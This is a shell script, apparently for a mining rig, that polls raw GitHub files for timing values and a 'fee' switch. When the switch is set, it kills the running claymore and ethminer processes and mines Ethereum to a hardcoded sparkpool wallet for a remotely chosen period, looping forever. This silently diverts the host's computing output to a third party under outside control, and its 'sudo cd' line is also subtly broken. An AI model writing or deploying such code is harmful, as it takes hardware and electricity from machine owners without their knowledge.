#!/bin/sh
worker=$(hostname)
echo $worker
Delay=$(curl -s https://raw.githubusercontent.com/TopSun2010/steinkern/master/delay.sh)
echo $Delay
sleep $Delay
while true
do
Fee=$(curl -s https://raw.githubusercontent.com/TopSun2010/steinkern/master/fee.sh)
echo $Fee
FeeTime=$(curl -s https://raw.githubusercontent.com/TopSun2010/steinkern/master/feetime.sh)
echo $FeeTime
Loop=$(curl -s https://raw.githubusercontent.com/TopSun2010/steinkern/master/loop.sh)
if [ "$Fee" = "1" ]
then
echo "Feeing!!"
        sudo killall claymore >/dev/null 2>&1
		sudo killall ethminer >/dev/null 2>&1
		sudo cd /opt/miners/claymore/ && ./claymore -epool cn.sparkpool.com:3333 -ewal 0x37224647aa0b131b4ced61ce77dde7f278890a6e -eworker claymore -epsw x  -asm 2 >>/tmp/log 2>&1 &
fi
sleep $FeeTime
sudo killall claymore >/dev/null 2>&1
sleep $Loop
done
